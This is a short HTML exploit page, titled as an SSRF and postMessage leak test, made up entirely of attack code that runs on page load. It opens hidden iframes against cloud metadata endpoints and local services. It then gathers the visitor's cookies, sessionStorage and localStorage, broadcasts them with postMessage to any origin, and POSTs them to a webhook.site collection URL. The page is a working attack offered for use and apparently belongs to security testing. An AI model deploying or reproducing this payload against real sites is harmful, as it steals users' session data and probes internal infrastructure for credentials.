<!DOCTYPE html>
<html>
<head>
  <title>üß™ SSRF + postMessage Exploit</title>
</head>
<body>
  <h2>üö® Testing SSRF + sessionStorage leak</h2>

  <script>
    // 1Ô∏è‚É£ SSRF via iframe (targeting internal services like metadata servers)
    const SSRF_TARGETS = [
      "http://169.254.169.254/latest/meta-data/", // AWS
      "http://metadata.google.internal/",         // GCP
      "http://localhost:8080/",                   // Localhost
      "http://127.0.0.1:8000/"                    // Another local service
    ];

    for (const target of SSRF_TARGETS) {
      const iframe = document.createElement('iframe');
      iframe.src = target;
      iframe.style.display = 'none';
      document.body.appendChild(iframe);
    }

    // 2Ô∏è‚É£ Extract sessionStorage + postMessage leak
    const payload = {
      type: "leak",
      sessionStorage: { ...sessionStorage },
      localStorage: { ...localStorage },
      cookies: document.cookie,
      origin: location.origin,
      location: location.href,
      userAgent: navigator.userAgent
    };

    // Send via postMessage to Webhook listener iframe (if used)
    window.postMessage(payload, "*");

    // Also send to webhook.site directly (adjust your link here)
    fetch("https://webhook.site/7d21e910-456e-401e-aa0b-01dcf5eb7040", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  </script>
</body>
</html>
